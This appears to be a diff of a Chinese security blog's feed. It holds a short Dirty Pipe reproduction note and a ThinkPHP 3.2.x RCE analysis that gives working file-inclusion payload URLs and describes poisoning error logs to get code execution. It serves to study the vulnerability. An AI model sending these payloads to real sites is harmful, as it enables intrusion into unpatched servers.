-&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">?m=Home&amp;amp;c=Index&amp;amp;a=index&amp;amp;value[_filename]=C://config.ini
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>首先我们的可控参数通过&lt;code>Controller.class.php&lt;/code>中的&lt;code>assign&lt;/code>函数最终跳到了&lt;code>View.class.php&lt;/code>中的&lt;code>assign&lt;/code>函数：
+&gt;&lt;/p&gt;
+&lt;h2 id="踩坑"&gt;踩坑
+&lt;/h2&gt;&lt;p&gt;刚开始想在docker上复现，拉的是ubuntu:lastest，但是尝试执行&lt;code&gt;dpkg -i linux-*.deb&lt;/code&gt;的时候报错：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;dpkg: dependency problems prevent configuration of linux-image-unsigned-5.8.0-050800-generic:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; linux-image-unsigned-5.8.0-050800-generic depends on kmod; however:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Package kmod is not installed.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; linux-image-unsigned-5.8.0-050800-generic depends on linux-base (&amp;gt;= 4.5ubuntu1~16.04.1); however:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Package linux-base is not installed.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;后面尝试执行&lt;code&gt;update-grub&lt;/code&gt;也报错：&lt;code&gt;/usr/sbin/grub-probe: error: failed to get canonical path of 'overlay'&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;但是看p神的文章就是在docker中复现的，因为对docker没有很深的研究及理解，所以没能解决，等以后有空再填坑吧&lt;/p&gt;
+&lt;h2 id="参考"&gt;参考
+&lt;/h2&gt;&lt;p&gt;&lt;a class="link" href="https://t.zsxq.com/vJ2zjaI" target="_blank" rel="noopener"
+&gt;https://t.zsxq.com/vJ2zjaI&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class="link" href="https://dirtypipe.cm4all.com/" target="_blank" rel="noopener"
+&gt;The Dirty Pipe Vulnerability — The Dirty Pipe Vulnerability documentation (cm4all.com)&lt;/a&gt;&lt;/p&gt;</description></item><item><title>TP3.2.xRCE</title><link>https://k1te.cn/p/tp3.2.xrce/</link><pubDate>Sat, 14 Aug 2021 16:19:19 +0800</pubDate><guid>https://k1te.cn/p/tp3.2.xrce/</guid><description>&lt;p&gt;前段时间打比赛的时候遇到了Think PHP3.2.x RCE的题目，这个洞是上个月爆出来的：&lt;a class="link" href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ" target="_blank" rel="noopener"
+&gt;【漏洞通报】ThinkPHP3.2.x RCE漏洞通报&lt;/a&gt;。虽然3已经不是主流版本了，但是考虑到还是有不少老的站在用，所以还是有一定的价值的，这里分析一下。&lt;/p&gt;
+&lt;h2 id="利用"&gt;利用
+&lt;/h2&gt;&lt;p&gt;这里用的是Think PHP3.2.5完整版，具体每个版本之间的区别可以看看参考链接&lt;/p&gt;
+&lt;p&gt;利用的条件是assign方法的第一个变量可控。因此我们可以在indexController写入demo：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;index&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;assign&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$value&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;display&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;payload：&lt;code&gt;?m=Home&amp;amp;c=Index&amp;amp;a=index&amp;amp;value[_filename]=.\Application\Runtime\Logs\Home\21_06_30.log&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;本质上是一个文件包含，再结合报错写log最终达到rce的目的&lt;/p&gt;
+&lt;h2 id="分析"&gt;分析
+&lt;/h2&gt;&lt;p&gt;这里我们先不包含log，而是包含config.ini来分析文件包含，payload：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;?m=Home&amp;amp;c=Index&amp;amp;a=index&amp;amp;value[_filename]=C://config.ini
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;首先我们的可控参数通过&lt;code&gt;Controller.class.php&lt;/code&gt;中的&lt;code&gt;assign&lt;/code&gt;函数最终跳到了&lt;code&gt;View.class.php&lt;/code&gt;中的&lt;code&gt;assign&lt;/code&gt;函数：
 &lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314192829727.png"
 width="449"
 height="69"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314192829727_hu16667192874750647793.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314192829727_hu8517754292988693722.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314192829727_hu_b21f23921c29ab04.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314192829727_hu_13bd53284eb3997d.png 1024w"
 loading="lazy"
 alt="test"
 class="gallery-image"
 data-flex-grow="650"
 data-flex-basis="1561px"
->&lt;/p>
-&lt;p>在该函数中将其赋值给&lt;code>$this-&amp;gt;tVar&lt;/code>变量：&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314193404552.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;在该函数中将其赋值给&lt;code&gt;$this-&amp;gt;tVar&lt;/code&gt;变量：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314193404552.png"
 width="887"
 height="198"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314193404552_hu1148837238617504674.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314193404552_hu16203959136362629107.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314193404552_hu_235eb9dbc4876b6c.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314193404552_hu_edf3591b7772ff36.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="447"
 data-flex-basis="1075px"
->&lt;/p>
-&lt;p>赋值结束后回到&lt;code>IndexController&lt;/code>再进入到&lt;code>display&lt;/code>函数，和上面的&lt;code>assign&lt;/code>函数一样最终跳到&lt;code>View.class.php&lt;/code>的&lt;code>display&lt;/code>函数中，该函数中的&lt;code>fetch&lt;/code>函数解析并获取模板文件内容，此时模板文件路径和内容为空：&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314194628910.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;赋值结束后回到&lt;code&gt;IndexController&lt;/code&gt;再进入到&lt;code&gt;display&lt;/code&gt;函数，和上面的&lt;code&gt;assign&lt;/code&gt;函数一样最终跳到&lt;code&gt;View.class.php&lt;/code&gt;的&lt;code&gt;display&lt;/code&gt;函数中，该函数中的&lt;code&gt;fetch&lt;/code&gt;函数解析并获取模板文件内容，此时模板文件路径和内容为空：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314194628910.png"
 width="926"
 height="268"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314194628910_hu2188691107088160224.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314194628910_hu14304364908615236887.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314194628910_hu_34cb82190a7f5e4b.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314194628910_hu_279298038dcd9816.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="345"
 data-flex-basis="829px"
->&lt;/p>
-&lt;p>继续跟进&lt;code>fetch&lt;/code>函数，该函数中将空的&lt;code>templateFile&lt;/code>传入&lt;code>parseTemplate&lt;/code>函数:&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314202547680.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;继续跟进&lt;code&gt;fetch&lt;/code&gt;函数，该函数中将空的&lt;code&gt;templateFile&lt;/code&gt;传入&lt;code&gt;parseTemplate&lt;/code&gt;函数:&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314202547680.png"
 width="685"
 height="205"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314202547680_hu18396467309646162402.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314202547680_hu15591332239516605305.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314202547680_hu_62c4502403db042f.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314202547680_hu_91ecba92a2f2fa7d.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="334"
 data-flex-basis="801px"
->&lt;/p>
-&lt;p>当参数为空时，&lt;code>parseTemplate&lt;/code>函数返回默认的模板文件位置&lt;code>./Application/Home/View/Index/index.html&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314200109873.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;当参数为空时，&lt;code&gt;parseTemplate&lt;/code&gt;函数返回默认的模板文件位置&lt;code&gt;./Application/Home/View/Index/index.html&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314200109873.png"
 width="685"
 height="226"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314200109873_hu10780829674757274184.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314200109873_hu16562431490737696462.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314200109873_hu_be0ebb125e8892a.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314200109873_hu_aec4f6430dd5dee9.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="303"
 data-flex-basis="727px"
->&lt;/p>
-&lt;p>接着往下走，系统配置的默认模板引擎为think，所以程序进入else分支&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314202818534.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;接着往下走，系统配置的默认模板引擎为think，所以程序进入else分支&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314202818534.png"
 width="926"
 height="550"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314202818534_hu586646372506602813.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314202818534_hu9475359208743805363.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314202818534_hu_265cd14a300c21cf.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314202818534_hu_de2999c9e4c88134.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="168"
 data-flex-basis="404px"
->&lt;/p>
-&lt;p>将&lt;code>this-&amp;gt;tVar&lt;/code>放入&lt;code>params&lt;/code>变量中跳入&lt;code>Hook::listen&lt;/code>，&lt;code>tag&lt;/code>变量是写死的&lt;code>view_parse&lt;/code>，因此&lt;code>name&lt;/code>变量为&lt;code>Behavior\ParseTemplateBehavior&lt;/code>，接着进入&lt;code>self::exec&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314204630431.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;将&lt;code&gt;this-&amp;gt;tVar&lt;/code&gt;放入&lt;code&gt;params&lt;/code&gt;变量中跳入&lt;code&gt;Hook::listen&lt;/code&gt;，&lt;code&gt;tag&lt;/code&gt;变量是写死的&lt;code&gt;view_parse&lt;/code&gt;，因此&lt;code&gt;name&lt;/code&gt;变量为&lt;code&gt;Behavior\ParseTemplateBehavior&lt;/code&gt;，接着进入&lt;code&gt;self::exec&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314204630431.png"
 width="883"
 height="686"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314204630431_hu16528124452292011744.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314204630431_hu3278037575816808279.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314204630431_hu_97f0a51c326a442f.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314204630431_hu_bc3e6cbb6e52125d.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="128"
 data-flex-basis="308px"
->&lt;/p>
-&lt;p>在&lt;code>exec&lt;/code>函数中调用&lt;code>Behavior\ParseTemplateBehavior&lt;/code>的&lt;code>run&lt;/code>方法处理带有我们可控参数的&lt;code>$params&lt;/code>变量：&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314205526410.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;在&lt;code&gt;exec&lt;/code&gt;函数中调用&lt;code&gt;Behavior\ParseTemplateBehavior&lt;/code&gt;的&lt;code&gt;run&lt;/code&gt;方法处理带有我们可控参数的&lt;code&gt;$params&lt;/code&gt;变量：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314205526410.png"
 width="486"
 height="201"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314205526410_hu9562397795221540899.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314205526410_hu9840742592818162137.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314205526410_hu_e885269f9edf912a.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314205526410_hu_2f165ebc39030641.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="241"
 data-flex-basis="580px"
->&lt;/p>
-&lt;p>在run方法中经过一些判断，最终调用&lt;code>fetch&lt;/code>函数编译并加载模板文件，此时第二个参数就是我们的可控参数：array(&amp;quot;_filename&amp;quot;=&amp;gt;&amp;ldquo;C://config.ini&amp;rdquo;);&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314210913491.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;在run方法中经过一些判断，最终调用&lt;code&gt;fetch&lt;/code&gt;函数编译并加载模板文件，此时第二个参数就是我们的可控参数：array(&amp;quot;_filename&amp;quot;=&amp;gt;&amp;ldquo;C://config.ini&amp;rdquo;);&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314210913491.png"
 width="1115"
 height="404"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314210913491_hu10996770989912004906.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314210913491_hu9672187218422621868.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314210913491_hu_b7dab9419edb4f57.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314210913491_hu_f8ecda63457aedf0.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="275"
 data-flex-basis="662px"
->&lt;/p>
-&lt;p>继续跟进&lt;code>fetch&lt;/code>，获取缓存文件路径后，进入Storage的load方法中：&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314211723255.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;继续跟进&lt;code&gt;fetch&lt;/code&gt;，获取缓存文件路径后，进入Storage的load方法中：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314211723255.png"
 width="628"
 height="365"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314211723255_hu12439327351795598866.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314211723255_hu6216297510177660076.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314211723255_hu_8a23745ad38b9d0a.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314211723255_hu_f2632b1c20d31088.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="172"
 data-flex-basis="412px"
->&lt;/p>
-&lt;p>在load方法中，&lt;code>$_filename&lt;/code>为之前获取的缓存文件路径，&lt;code>$var&lt;/code>则为之前带有&lt;code>_filename=C://config.ini&lt;/code>的数组，利用extract方法进行变量覆盖，实现任意文件包含：&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314212032452.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;在load方法中，&lt;code&gt;$_filename&lt;/code&gt;为之前获取的缓存文件路径，&lt;code&gt;$var&lt;/code&gt;则为之前带有&lt;code&gt;_filename=C://config.ini&lt;/code&gt;的数组，利用extract方法进行变量覆盖，实现任意文件包含：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314212032452.png"
 width="1079"
 height="163"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314212032452_hu8786334477568844574.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314212032452_hu16216860117112078952.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314212032452_hu_bfe99414db331bc6.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314212032452_hu_37ba6319f2a4b46b.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="661"
 data-flex-basis="1588px"
->&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314212715859.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314212715859.png"
 width="600"
 height="343"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314212715859_hu3788058853134331418.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314212715859_hu9951118566434817691.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314212715859_hu_c5fd80d866c2f00c.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314212715859_hu_62f763d4909c0e75.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="174"
 data-flex-basis="419px"
->&lt;/p>
-&lt;p>众所周知，include函数不在意包含的什么文件：&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314233622026.png"
+&gt;&lt;/p&gt;
+&lt;p&gt;众所周知，include函数不在意包含的什么文件：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/tp3.2.xrce/image-20220314233622026.png"
 width="983"
 height="327"
-srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314233622026_hu4382227923735885799.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314233622026_hu5994275899394673214.png 1024w"
+srcset="https://k1te.cn/p/tp3.2.xrce/image-20220314233622026_hu_98fb2e60f24beccf.png 480w, https://k1te.cn/p/tp3.2.xrce/image-20220314233622026_hu_d7db89c7caf4de14.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="300"
 data-flex-basis="721px"
->&lt;/p>
-&lt;p>因此我们可以构造一个不存在的模块，使得tp报错，此时tp会将url写入log中，所以我们可以在url中写入恶意代码，再结合上面的LFI实现任意代码执行。&lt;/p>
-&lt;h2 id="heading">=======
-&lt;/h2>&lt;p>title: &amp;ldquo;TP3.2.xRCE&amp;rdquo;
+&gt;&lt;/p&gt;
+&lt;p&gt;因此我们可以构造一个不存在的模块，使得tp报错，此时tp会将url写入log中，所以我们可以在url中写入恶意代码，再结合上面的LFI实现任意代码执行。&lt;/p&gt;
+&lt;h2 id="heading"&gt;=======
+&lt;/h2&gt;&lt;p&gt;title: &amp;ldquo;TP3.2.xRCE&amp;rdquo;
 date: 2021-08-14T16:19:19+08:00
-categories:&lt;/p>
-&lt;ul>
-&lt;li>漏洞复现
-tags:&lt;/li>
-&lt;li>TP&lt;/li>
-&lt;li>web&lt;/li>
-&lt;/ul>
-&lt;hr>
-&lt;p>前段时间打比赛的时候遇到了Think PHP3.2.x RCE的题目，这个洞是上个月爆出来的：&lt;a class="link" href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ" target="_blank" rel="noopener"
->【漏洞通报】ThinkPHP3.2.x RCE漏洞通报&lt;/a>。虽然3已经不是主流版本了，但是考虑到还是有不少老的站在用，所以还是有一定的价值的，这里分析一下。&lt;/p>
-&lt;h2 id="利用-1">利用
-&lt;/h2>&lt;p>这里用的是Think PHP3.2.5完整版，具体每个版本之间的区别可以看看参考链接&lt;/p>
-&lt;p>利用的条件是assign方法的第一个变量可控。因此我们可以在indexController写入demo：&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;span class="lnt">4
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="k">function&lt;/span> &lt;span class="nf">index&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">){&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">assign&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$value&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">display&lt;/span>&lt;span class="p">();&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>payload：&lt;code>?m=Home&amp;amp;c=Index&amp;amp;a=index&amp;amp;value[_filename]=.\Application\Runtime\Logs\Home\21_06_30.log&lt;/code>&lt;/p>
-&lt;p>本质上是一个文件包含，再结合报错写log最终达到rce的目的&lt;/p>
-&lt;h2 id="分析-1">分析
-&lt;/h2>&lt;p>这里我们先不包含log，而是包含config.ini来分析文件包含，payload：&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">?m=Home&amp;amp;c=Index&amp;amp;a=index&amp;amp;value[_filename]=C://config.ini
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>首先我们的可控参数通过&lt;code>Controller.class.php&lt;/code>中的&lt;code>assign&lt;/code>函数最终跳到了&lt;code>View.class.php&lt;/code>中的&lt;code>assign&lt;/code>函数：
+categories:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;漏洞复现
+tags:&lt;/li&gt;
+&lt;li&gt;TP&lt;/li&gt;
+&lt;li&gt;web&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;p&gt;前段时间打比赛的时候遇到了Think PHP3.2.x RCE的题目，这个洞是上个月爆出来的：&lt;a class="link" href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ" target="_blank" rel="noopener"
+&gt;【漏洞通报】ThinkPHP3.2.x RCE漏洞通报&lt;/a&gt;。虽然3已经不是主流版本了，但是考虑到还是有不少老的站在用，所以还是有一定的价值的，这里分析一下。&lt;/p&gt;
+&lt;h2 id="利用-1"&gt;利用
+&lt;/h2&gt;&lt;p&gt;这里用的是Think PHP3.2.5完整版，具体每个版本之间的区别可以看看参考链接&lt;/p&gt;
+&lt;p&gt;利用的条件是assign方法的第一个变量可控。因此我们可以在indexController写入demo：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;index&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;assign&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$value&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;display&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
